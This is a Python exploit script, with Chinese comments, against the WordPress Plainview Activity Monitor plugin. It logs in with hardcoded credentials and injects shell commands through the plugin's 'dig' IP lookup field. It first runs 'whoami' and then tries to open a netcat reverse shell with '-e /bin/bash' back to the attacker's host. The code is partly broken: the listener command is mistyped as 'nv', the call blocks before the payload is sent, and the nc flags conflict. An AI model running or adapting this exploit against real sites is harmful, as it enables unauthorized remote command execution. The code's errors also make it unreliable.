import requests
from bs4 import BeautifulSoup
import os
"""
wordpress plainview_activity_monitor 20161228
RCE漏洞，未过滤用户输入
漏洞需要：已登录用户信息
漏洞产生：该插件提供了解析ip到域名的功能，如果服务器中可以使用dig，则会执行dig -x ip来解析（exec ('dig -x'.ip)） --> 用户输入可执行，可利用管道符执行命令 
"""
class exp_50110:
    def __init__(self, lhost, lport, rhost, rport):
        self.lhost = lhost
        self.lport = lport
        self.rhost = rhost
        self.rport = rport
        
        #self.poc()
    
    def __get_usr_info(self):
        #self.username = input("username:")
        #self.passwd = input("passwd:")
        self.username = "mark"
        self.passwd = "helpdesk01"
        
    def get_cookie(self):
        admin_url = "http://" + self.rhost + "/wp-login.php"
        self.__get_usr_info()
        data = {
            'log': self.username,
            'pwd': self.passwd,
            #wp-submit=Log+In&redirect_to=http%3A%2F%2Fwordy%2Fwp-admin%2F&testcookie=1
            'wp-submit': 'Log In',
            'testcookie': 1
        }
        
        x = requests.post(admin_url, data = data)
        self.cookies = {}
        cookie = str(x.headers['Set-Cookie'])
        
        for i in cookie.split():
            if "wordpress" in i and "=" in i:
                self.cookies[i.split('=')[0]] = i.split('=')[1][:len(i.split('=')[1])-1]
        print(self.cookies)
        
            
    def poc(self):
        self.url = "http://" + self.rhost + "/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools"
        self.get_cookie()
        data = {
            'ip': 'google.fr | whoami',
            'lookup': 'Lookup'
        }
        x = requests.post(self.url, data=data, cookies=self.cookies)
        #解析出whoami的执行结果
        html_doc = x.text.split("<p>Output from dig: </p>")[1]
        soup = BeautifulSoup(html_doc, "html.parser")
        whoami = soup.find('p').text

        print("[*]Exploit Succeed! ")
        self.exploit(whoami)
        
        
    
    def exploit(self, whoami):
        #本机监听 --> windows nc
        os.system("nv -lvvp {}".format(self.lport))
        
        #发送exp
        data = {
            'ip': 'google.fr | nc -nlvp {} {} -e /bin/bash'.format(self.lhost, self.lport),
            'lookup': 'Lookup'
        }
        
        requests.post(self.url, data=data, cookies=self.cookies)
        
        
        
a = exp_50110('127.0.0.1', '4444', '192.168.1.102', '80')
a.poc()